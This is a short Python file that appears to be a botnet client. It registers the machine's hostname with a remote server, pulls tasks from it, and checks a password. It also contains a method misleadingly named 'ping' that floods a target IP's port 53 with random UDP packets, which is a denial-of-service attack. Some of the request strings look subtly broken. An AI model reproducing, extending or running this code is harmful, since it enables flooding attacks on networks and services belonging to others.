import socket
import requests
import random
from requests.exceptions import ConnectionError, Timeout, TooManyRedirects
import json

class API:
    def __init__(self):
        self.endpoint = "http://taco.csh.rit.edu"

    def getTasks(self, task):
        r = requests.get(f"{self.endpoint}/getTasks?task = {task}")
        return r.json()

    def askForCode(self):
        code = input('Your code:')
        r =  requests.get(f"{self.endpoint}/verifycode?password = {code}")
        return r.json()

    def registerClient(self):
        name = (socket.gethostname())
        r = requests.get(f"{self.endpoint}/addclient?name ={name}")
        return r.json()

    def validentClient(self, clients):
        return 'null'

    def ping(self, chunk, ip):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(1362)
        ip = ip
        sent = 0
        i = chunk
        while i >= 0:
            sock.sendto(bytes, (ip, 53))
            print("Sent %s amount of packets to %s at port %s." % (sent, ip, 53))
            sent = sent + 1
            i = i - 1


